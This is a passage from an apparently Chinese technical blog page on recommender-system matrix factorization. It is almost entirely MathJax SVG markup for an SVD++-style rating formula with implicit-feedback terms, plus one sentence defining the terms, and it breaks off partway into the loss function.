<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 56.795ex"><svg style="vertical-align: -2.114ex; min-width: 56.795ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="5.359ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -1434.4)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2578, 0) translate(-2578, 0)"><g transform="translate(0 1434.4) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="9973.8 -1434.4 1 2368.8"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, 409.8)"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(451, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(572, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(850, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1623.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2679.5, 0)"><path data-c="1D707" d="M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z"></path></g><g data-mml-node="mo" transform="translate(3504.8, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(4505, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(429, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5450.2, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(6450.4, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(429, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7556.1, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msubsup" transform="translate(8556.3, 0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(485, -247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(9811.3, 0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(10533.5, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(10922.5, 0)"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(11949, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(13004.8, 0)"><path data-c="2223" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(13560.6, 0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(440, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="msup" transform="translate(14732.8, 0)"><g data-mml-node="mo"><path data-c="2223" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="TeXAtom" transform="translate(278, 413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mfrac" transform="translate(778, 0)"><g data-mml-node="mn" transform="translate(220, 394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(220, -345) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g><g data-mml-node="mo" transform="translate(16449.8, 0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="munder" transform="translate(17116.5, 0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(24.3, -1100) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(412, 0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="msub" transform="translate(1079, 0)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(440, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(18727.2, 0)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(490, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="mo" transform="translate(19558.5, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1778 -1434.4 1 2368.8"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-10" transform="translate(0, 409.8)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(389, 0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(889, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(1389, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>其中<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.024ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 894.5 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(440, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span>是该用户有隐式行为的所有物品集合，而<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="1.881ex" height="1.666ex" role="img" focusable="false" viewBox="0 -442 831.3 736.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(490, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container></span>是隐式评分电影j反应出的喜好值。损失函数相应的变为：</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 71.258ex"><svg style="vertical-align: -4.967ex; min-width: 71.258ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="11.065ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -2695.4)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2578, 0) translate(-2578, 0)"><g transform="translate(0 2695.4) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="13169.9 -2695.4 1 4890.9"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr"><g data-mml-node="mtd"><g data-mml-node="mtable"><g data-mml-node="mtr" transform="translate(0, 1670.8)"><g data-mml-node="mtd"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 